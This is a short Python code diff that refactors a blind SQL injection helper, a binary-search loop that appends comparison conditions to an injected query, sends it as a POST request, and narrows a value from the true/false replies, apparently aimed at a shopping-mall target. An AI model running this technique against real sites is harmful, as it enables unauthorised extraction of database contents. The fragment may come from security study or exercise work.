@@ -1,15 +1,22 @@
+from attack_setting import attackData
+from attack_query import attackQuerys
 
-def length_search(query,min=1,max=200):
-    attack_query = "("+query+")>{}"
+def binary_search(destination,query):
 
+    
+    min,max = 1,20
     while (max > min):
         avg = (max+min)//2 
-        attack_url = attack_query.format(avg)
-        if shopping_mall_injection(url,cookies,attack_url)==True: #여기에 쿼리 공격 넣음 
+        attack_query = query+">{}"
+        attack_query = attack_query.format(avg)
+        attack_url = attackQuerys.get_complete_query('test',attack_query)
+        print(attack_url)
+        
+        if destination.send_post_request(attack_url)==True: #여기에 쿼리 공격 넣음 
             min = avg+1
         else:
             max = avg
-        #print(min,max)  
+        print(min,max)  
     return min
 
 def user_search(query,length):
